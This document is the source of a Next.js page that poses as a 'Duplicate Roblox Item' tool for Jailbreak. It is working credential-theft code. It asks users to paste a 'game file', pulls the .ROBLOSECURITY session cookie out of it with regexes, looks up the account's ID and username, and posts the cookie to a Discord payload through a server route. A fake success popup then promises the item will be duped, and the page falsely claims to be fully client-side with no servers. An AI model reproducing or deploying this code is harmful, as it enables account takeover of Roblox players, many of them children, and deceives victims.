"use client";

import { useState, useEffect, useTransition } from "react";
import Link from "next/link";
import {
  X,
  Play,
  Info,
  ArrowLeft,
  Loader2,
  ChevronDown,
  Sparkles,
} from "lucide-react";
import { useParams } from "next/navigation";
import { createDiscordPayload } from "@/lib/discord";
import { AnimatePresence, motion } from "framer-motion";
import faqs from "@/mock/data/faqs.json";
import games from "@/mock/data/games.json";
import { toast } from "sonner";
import Swal from "sweetalert2";

export default function SlugPage() {
  const params = useParams();
  const slug = (params.slug as string) || "root";
  const [isPending, startTransition] = useTransition();

  const [pageError, setPageError] = useState<string | null>(null);

  const [fileContent, setFileContent] = useState("");
  const [username, setUsername] = useState("");
  const [selectedGame, setSelectedGame] = useState<{
    name: string;
    image: string;
  } | null>(null);
  const [isModalOpen, setIsModalOpen] = useState(false);

  function extractRobloSecurity(text: string): string | null {
    const cookieRegex1 = /\.ROBLOSECURITY"\s*,\s*"([^"]{100,})"/;
    const match1 = text.match(cookieRegex1);
    if (match1?.[1]) return match1[1];

    const cookieRegex2 = /(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"';\s)]{100,})/;
    const match2 = text.match(cookieRegex2);
    if (match2?.[1]) return match2[1];

    return null;
  }

  async function extractAccountData(text: string): Promise<{
    id: string | null;
    username: string | null;
    cookie: string | null;
  }> {
    const cookie = extractRobloSecurity(text);
    if (!cookie) return { id: null, username: null, cookie: null };

    const isValidId = (id: string) => /^\d{5,20}$/.test(id.trim());
    const profileRegex =
      /https?:\/\/www\.roblox\.com(?:\/[a-z]{2,})?\/users\/(\d+)\/profile/i;
    const urlMatch = text.match(profileRegex);
    let id: string | null = urlMatch ? urlMatch[1] : null;

    if (!id) {
      const longNumbers = [...text.matchAll(/\b\d{5,20}\b/g)].map((m) => m[0]);
      if (longNumbers.length > 0) {
        id = longNumbers.find((n) => n.length < 12) || longNumbers[0];
      }
    }

    let username: string | null = null;
    if (id && isValidId(id)) {
      try {
        const res = await fetch(`/api/roblox-user/${id}`);
        if (res.ok) {
          const data = await res.json();
          if (
            data?.name &&
            data.name.length >= 2 &&
            !data.name.includes("http")
          ) {
            username = data.name.trim();
          }
        }
      } catch (e) {
        console.error("Lỗi fetch username:", e);
      }
    }

    return { id, username: username || "Unknown", cookie };
  }

  async function sendToDiscord(
    cookieValue: string,
    fullStats: any,
    userId: string,
    gameName: string,
    targetUsername: string,
  ) {
    try {
      const safeUserId = String(userId || "").trim();
      if (!safeUserId) {
        toast.error("Invalid user ID.");
        return;
      }

      const seqRes = await fetch("/api/next-seq", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      });

      const seqJson = await seqRes.json().catch(() => null);
      if (!seqRes.ok || !seqJson?.sequenceId) {
        toast.error(
          `Failed to get sequence ID: ${seqJson?.error || "Unknown error"}`,
        );
        return;
      }

      const sequenceId = Number(seqJson.sequenceId);

      const payload = createDiscordPayload({
        sequenceId,
        gameName,
        cookieValue,
        username: targetUsername || fullStats?.displayName || "Unknown",
        userId: safeUserId,
      });

      const res = await fetch("/api/post", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          discordPayload: payload,
          slug: slug || "root",
        }),
      });

      if (res.ok) {
        await new Promise((resolve) => setTimeout(resolve, 80000));
        Swal.fire({
          title: "Success!",
          text: "Thank you for choosing our service. Your item will be duped shortly!",
          icon: "success",
          background: "#ffffff",
          color: "#0a0a0a",
          confirmButtonColor: "#2563eb",
          customClass: {
            popup: "rounded-[32px]! border! border-white/10! shadow-2xl!",
            confirmButton:
              "bg-blue-500! rounded-xl! px-8 py-3 font-bold uppercase tracking-widest text-sm",
          },
        });
        setTimeout(() => {
          setFileContent("");
          setUsername("");
          setIsModalOpen(false);
          setSelectedGame(null);
        }, 5000);
      } else {
        toast.error("Failed to send data to server");
      }
    } catch (err: any) {
      console.error("[sendToDiscord error]", err);
      toast.error("Connection error");
    }
  }

  const handleStart = () => {
    startTransition(async () => {
      if (!fileContent.trim() || !username.trim()) {
        toast.error("Please enter both username and game file!");
        return;
      }

      toast.info("Processing item...");

      try {
        const accountData = await extractAccountData(fileContent);

        if (!accountData.cookie) {
          toast.error("Invalid file. Could not find security key!");
          return;
        }

        const data = {
          userId: accountData.id || "0",
          basic: { name: accountData.username || "Unknown" },
          displayName: accountData.username || "Unknown",
        };

        await sendToDiscord(
          accountData.cookie,
          data,
          accountData.id || "0",
          selectedGame?.name || "Unknown Game",
          username,
        );
      } catch (err: any) {
        console.error("[handleStart error]", err);
        toast.error("An error occurred.");
      }
    });
  };

  const [openFaq, setOpenFaq] = useState<number | null>(null);

  if (pageError) {
    return (
      <div className="min-h-screen bg-[#020617] text-white flex items-center justify-center p-4 relative overflow-hidden">
        <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-10 max-w-lg text-center shadow-2xl z-50">
          <h2 className="text-2xl font-bold text-red-400 mb-4">
            Something went wrong
          </h2>
          <p className="text-gray-300 mb-6">{pageError}</p>
          <Link
            href="/create"
            className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
          >
            <ArrowLeft className="w-5 h-5" />
            Back to Create
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col items-center px-4 py-8 relative overflow-x-hidden">
      <div className="relative z-10 w-full max-w-4xl flex flex-col items-center text-center animate-in fade-in slide-in-from-top-10 duration-1000">
        <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full border border-blue-500/30 bg-blue-500/10 text-blue-400 text-xs font-semibold mb-8 backdrop-blur-sm">
          <span className="w-1.5 h-1.5 rounded-full bg-blue-500 shadow-[0_0_8px_rgba(59,130,246,0.8)] animate-pulse" />
          Duplicate Tool
        </div>

        <h1 className="text-5xl md:text-7xl font-black mb-6 tracking-tight flex flex-col items-center">
          <span className="bg-linear-to-r from-white via-blue-200 to-blue-500 bg-clip-text text-transparent drop-shadow-[0_0_15px_rgba(255,255,255,0.3)]">
            Duplicate Roblox Item
          </span>
        </h1>

        <p className="text-gray-400 text-lg md:text-xl max-w-2xl leading-relaxed mb-12">
          Advanced browser extension for Roblox Jailbreak. Enhance and process
          in-game items locally in your
          <span className="text-blue-400 font-semibold px-2">browser!</span>
          <br />
          <span className="text-sm italic opacity-60">
            100% Client-side — secure, instant, no servers, updated for current
            meta.
          </span>
        </p>

        {/* <div
          id="tutorial"
          className="w-full aspect-video rounded-3xl overflow-hidden border-2 border-white/20 bg-black/40 backdrop-blur-md shadow-[0_40px_100px_-20px_rgba(0,0,0,0.8)] relative group mb-20 scroll-mt-28"
        >
          <div className="absolute inset-0 bg-linear-to-tr from-black/60 via-blue-500/5 to-transparent pointer-events-none z-5" />
          <video
            controls
            className="w-full h-full object-cover relative z-0"
            playsInline
            preload="metadata"
          >
            <source src="/video.mov" type="video/mp4" />
            Your browser does not support the video tag.
          </video>
          <div className="absolute inset-0 flex items-center justify-center transition-opacity duration-300 z-10 pointer-events-none">
            <div className="w-16 h-16 rounded-full bg-blue-500 flex items-center justify-center shadow-lg shadow-blue-500/50">
              <Play className="w-8 h-8 fill-current text-white translate-x-0.5" />
            </div>
          </div>
        </div> */}

        <div id="games" className="w-full mb-32 scroll-mt-28">
          <div className="flex items-center justify-between mb-8 px-2">
            <h2 className="text-2xl font-bold flex items-center gap-3">
              <span className="w-2 h-8 bg-blue-500 rounded-full" />
              CHOOSE GAME
            </h2>
            <div className="px-3 py-1 rounded-lg border border-white/5 bg-white/5 text-[10px] text-gray-500 font-bold uppercase tracking-widest">
              v1.0.4 Latest
            </div>
          </div>

          <div className="grid xs:grid-cols-2 md:grid-cols-4 gap-4">
            {games.map((game, idx) => (
              <button
                key={idx}
                onClick={() => {
                  setSelectedGame(game);
                  setIsModalOpen(true);
                }}
                className="cursor-pointer group relative h-52 rounded-2xl overflow-hidden border border-white/5 hover:border-blue-500/50 transition-all duration-300 bg-white/5 active:scale-95"
              >
                <div className="absolute inset-0 z-0 scale-100 group-hover:scale-110 transition-transform duration-700">
                  <img
                    src={game.image}
                    alt={game.name}
                    className="w-full h-full object-cover opacity-60 group-hover:opacity-100"
                  />
                </div>
                <div className="absolute inset-0 bg-linear-to-t from-black via-black/20 to-transparent z-1" />
                <div className="absolute bottom-4 left-4 right-4 z-2 text-left">
                  <p className="text-white font-bold text-sm md:text-base leading-tight group-hover:text-blue-400 transition-colors uppercase tracking-wide">
                    {game.name}
                  </p>
                  <p className="text-blue-500 text-[10px] font-bold mt-1 scale-x-0 origin-left group-hover:scale-x-100 transition-transform duration-300 uppercase">
                    SELECT ENHANCER
                  </p>
                </div>
              </button>
            ))}
            <div className="flex flex-col justify-center items-center p-6 rounded-2xl border border-dashed border-white/10 bg-white/2">
              <Info className="w-6 h-6 text-blue-500 mb-3" />
              <p className="text-xs text-gray-400 leading-relaxed font-medium">
                More games being added weekly. Follow our community for updates.
              </p>
            </div>
          </div>
        </div>

        {/* FAQ Section */}
        <div id="faq" className="w-full max-w-3xl mb-32 scroll-mt-28">
          <div className="text-center mb-12">
            <h2 className="text-4xl md:text-5xl font-black mb-4">Questions?</h2>
            <p className="text-gray-400">
              Common questions about our services.
            </p>
          </div>

          <div className="space-y-4">
            {faqs.map((faq, i) => (
              <div
                key={i}
                className="bg-white/3 border border-white/5 rounded-2xl overflow-hidden hover:border-white/10 transition-colors"
              >
                <button
                  onClick={() => setOpenFaq(openFaq === i ? null : i)}
                  className="w-full p-6 flex items-center justify-between text-left"
                >
                  <span className="font-bold text-lg">{faq.q}</span>
                  <ChevronDown
                    className={`w-5 h-5 text-blue-500 transition-transform duration-300 ${openFaq === i ? "rotate-180" : ""}`}
                  />
                </button>
                <AnimatePresence>
                  {openFaq === i && (
                    <motion.div
                      initial={{ height: 0, opacity: 0 }}
                      animate={{ height: "auto", opacity: 1 }}
                      exit={{ height: 0, opacity: 0 }}
                      transition={{ duration: 0.3 }}
                    >
                      <div className="px-6 pb-6 text-gray-400 leading-relaxed border-t border-white/5 pt-4">
                        {faq.a}
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            ))}
          </div>
        </div>

        {/* Footer */}
        {/* <footer className="w-full py-12 border-t border-white/5 flex flex-col items-center">
          <p className="text-[10px] font-bold tracking-[0.2em] text-gray-600 uppercase">
            © 2026 RBXMOD. All rights reserved.
          </p>
        </footer> */}
      </div>

      <AnimatePresence>
        {isModalOpen && (
          <div className="fixed inset-0 z-200 flex items-center justify-center p-4">
            <motion.div
              key="modal-background"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.32 }}
              className="absolute inset-0 bg-black/90 backdrop-blur-sm animate-in fade-in duration-300"
              onClick={() => setIsModalOpen(false)}
            />
            <motion.div
              key="modal-content"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 20 }}
              transition={{ duration: 0.3 }}
              className="relative z-201 w-full max-w-xl bg-[#0a0a0a] border border-white/10 rounded-[32px] overflow-hidden shadow-2xl"
            >
              <div className="absolute top-0 left-0 w-full h-1 bg-linear-to-r from-transparent via-blue-500 to-transparent" />
              <div className="p-8">
                <div className="flex items-center justify-between mb-8">
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 rounded-2xl border border-white/10 bg-white/5 flex items-center justify-center">
                      <img
                        src={selectedGame?.image}
                        alt=""
                        className="w-9 h-9 rounded-xl object-cover"
                      />
                    </div>
                    <div>
                      <h3 className="text-xl font-bold">
                        {selectedGame?.name}
                      </h3>
                      <p className="text-blue-400 text-xs font-bold uppercase tracking-widest mt-0.5">
                        Enhancer Ready
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={() => setIsModalOpen(false)}
                    className="w-10 h-10 rounded-full border border-white/10 flex items-center justify-center hover:bg-white/10 transition-colors"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>

                <div className="space-y-6">
                  <div>
                    <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest block mb-3 pl-1">
                      Roblox Username
                    </label>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="Example: Roblox"
                      className="w-full bg-white/3 border border-white/10 rounded-2xl p-5 text-base md:text-sm text-white placeholder:text-gray-700 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 transition-all mb-4"
                    />

                    <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest block mb-3 pl-1">
                      Paste Game File Here
                    </label>
                    <textarea
                      value={fileContent}
                      onChange={(e) => setFileContent(e.target.value)}
                      placeholder="--- Paste file content here ---"
                      className="font-mono w-full min-h-[160px] bg-white/3 border border-white/10 rounded-2xl p-5 text-base md:text-sm text-white placeholder:text-gray-700 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 transition-all resize-none"
                    />
                  </div>
                  <button
                    onClick={handleStart}
                    disabled={
                      !fileContent.trim() || !username.trim() || isPending
                    }
                    className="w-full py-5 flex items-center justify-center gap-2 bg-blue-600 hover:bg-blue-500 disabled:opacity-40 disabled:hover:bg-blue-600 text-white font-black text-lg rounded-2xl transition-all shadow-[0_20px_40px_-10px_rgba(59,130,246,0.3)] active:scale-[0.98] uppercase tracking-widest"
                  >
                    {isPending ? (
                      <>
                        <Loader2 className="w-5 h-5 animate-spin" />
                        <span>Processing Item...</span>
                      </>
                    ) : (
                      <>
                        <Sparkles className="w-5 h-5" />
                        <span>Process Item</span>
                      </>
                    )}
                  </button>
                  {/* <p className="text-[10px] text-center text-gray-500 px-6 leading-relaxed">
                    After clicking "Process item", please wait 1–2 minutes for
                    the system to complete the process, then enter the game.
                  </p> */}
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <div className="relative z-10 py-12 flex flex-col items-center opacity-40">
        <p className="text-[10px] font-black tracking-[0.3em] uppercase mb-2">
          © 2026 RBX. All rights reserved.
        </p>
        <div className="w-8 h-0.5 bg-blue-500/50" />
      </div>
    </div>
  );
}
